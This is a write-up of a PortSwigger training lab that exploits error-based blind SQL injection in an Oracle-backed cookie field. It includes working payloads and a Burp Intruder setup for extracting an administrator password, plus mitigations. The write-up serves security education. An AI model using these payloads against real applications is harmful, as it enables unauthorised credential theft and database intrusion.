# Blind SQL Injection with Conditional Errors (Oracle)

## Overview

This repository documents the exploitation of a **blind SQL injection vulnerability using conditional errors** in a PortSwigger Web Security Academy lab.

The vulnerable application places the value of a tracking cookie directly into a SQL query. Query results are not returned to the client, but the application responds differently when the injected SQL causes a database error. This behavior creates a side channel that can be used to infer sensitive data one condition at a time.

## Lab Summary

| Field | Value |
|---|---|
| Platform | PortSwigger Web Security Academy |
| Lab | Blind SQL injection with conditional errors |
| Injection point | `TrackingId` cookie |
| Database | Oracle |
| Technique | Error-based blind SQL injection |
| Target data | Password of the `administrator` user |
| Tools | Burp Suite Repeater and Intruder |

## Vulnerability Analysis

The application does not display SQL query results. However, database errors produce a different HTTP response from normal requests.

This makes it possible to evaluate Boolean conditions indirectly:

| Condition result | Database behavior | HTTP response |
|---|---|---|
| True | Deliberate divide-by-zero error | `500 Internal Server Error` |
| False | No database error | `200 OK` |

Oracle-specific syntax is relevant because standalone `SELECT` statements require a table reference such as `dual`. Oracle string concatenation also uses `||`.

## Conditional Error Payload

The following payload tests whether a selected character of the administrator password matches a supplied value:

```sql
' || (
  SELECT CASE
    WHEN SUBSTR(password, 1, 1) = 'a'
    THEN TO_CHAR(1/0)
    ELSE ''
  END
  FROM users
  WHERE username = 'administrator'
) || '
```

### Payload Logic

- `SUBSTR(password, 1, 1)` extracts one character from the password.
- `CASE WHEN` evaluates whether the extracted character matches the tested value.
- `TO_CHAR(1/0)` deliberately triggers a divide-by-zero error when the condition is true.
- `||` concatenates the injected expression into the original Oracle query.
- The `users` table and `administrator` account are defined by the lab scenario.

## Manual Validation

A single character can be tested by changing the comparison value:

```sql
SUBSTR(password, 1, 1) = 'a'
```

Example response pattern:

| Character tested | Status code | Interpretation |
|---|---:|---|
| `a` | 200 | False |
| `b` | 500 | True |
| `c` | 200 | False |

In this example, the first password character is inferred to be `b`.

![Conditional error response in Burp Suite](https://github.com/user-attachments/assets/dd11eb09-c399-4720-bac4-c7eb9639a6da)

## Automating Extraction with Burp Intruder

The password extraction process was automated with Burp Suite Intruder.

### Payload Template

Two payload positions are required:

```sql
' || (
  SELECT CASE
    WHEN SUBSTR(password, §1§, 1) = '§a§'
    THEN TO_CHAR(1/0)
    ELSE ''
  END
  FROM users
  WHERE username = 'administrator'
) || '
```

![Burp Intruder payload positions](https://github.com/user-attachments/assets/5ad28d3b-dc12-426c-8bb6-1139ec08244a)

### Intruder Configuration

| Setting | Configuration |
|---|---|
| Attack type | Cluster bomb |
| Payload set 1 | Password positions `1-20` |
| Payload set 2 | Lowercase letters `a-z` and digits `0-9` |
| Total combinations | `20 × 36 = 720` requests |
| Success indicator | HTTP status `500` |

Each password position is tested against every allowed character. The request that produces a `500` response identifies the correct character for that position.

## Security Impact

An attacker can extract sensitive database values even when:

- SQL query results are not displayed.
- Detailed database errors are suppressed.
- The vulnerable parameter is located in an HTTP cookie rather than a visible form field.

The vulnerability may expose credentials, personal data, session information, or other records accessible to the application database account.

## Recommended Mitigations

1. Use parameterized queries or prepared statements for all database operations.
2. Never concatenate untrusted cookie, header, URL, or form values into SQL statements.
3. Return consistent application responses for database failures.
4. Apply least privilege to the application database account.
5. Log and alert on repeated malformed cookie values and abnormal error rates.
6. Use input validation as a supporting control, not as a replacement for parameterized queries.

## References

- [PortSwigger Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [PortSwigger SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

## Disclaimer

This write-up documents activity performed in an intentionally vulnerable training environment. The techniques must only be used against systems for which explicit authorization has been granted.
